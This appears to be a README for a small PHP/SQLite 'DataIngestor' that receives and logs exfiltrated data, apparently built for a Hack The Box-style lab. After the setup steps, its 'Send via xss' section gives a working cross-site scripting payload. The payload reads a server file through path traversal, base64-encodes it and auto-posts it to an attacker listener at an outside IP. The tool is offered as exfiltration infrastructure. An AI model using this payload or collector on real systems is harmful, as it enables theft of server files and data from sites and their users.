# DataIngestor

Create the database 
```console
cd 306d717c3f592af0186ed31e2f056a7d
sqlite3 data.db "CREATE TABLE entries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    data TEXT NOT NULL,
    referrer TEXT,
    client_ip TEXT NOT NULL,
    entry_datetime DATETIME
);"
```

create a config.php file with:

```php

<?php

// Define the allowed CIDR range and IP addresses
$allowedCIDR = '19.12.0.0/16';
$allowedIPs = ['127.0.0.1']; //Add your ip to this array

?>
```

Run the php server
```console
php -S 0.0.0.0:6745 -t ./
```

Make the proxy conf on the remote server under /etc/nginx/conf.d/proxy.conf from proxy.conf.
if you want to work locally and forward your traffic through to another device

```console
ssh root@<remote-ip> -R 6745:127.0.0.1:6745
```

To send to the ingestor:

```console
curl -k -X POST -d "data=test" https://domain.com/
```

Send via xss:

```html
<img src=x onerror="fetch('/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/index.php')
.then(response => response.text())
.then(data => {
f=document.createElement`form`;
f.innerHTML='<input name=data value='+btoa(data)+'>';
f.method='post';
f.action='http://10.10.14.159:6745/index.php';
document.body.appendChild(f);
f.submit();
document.body.removeChild(f);
});">
```
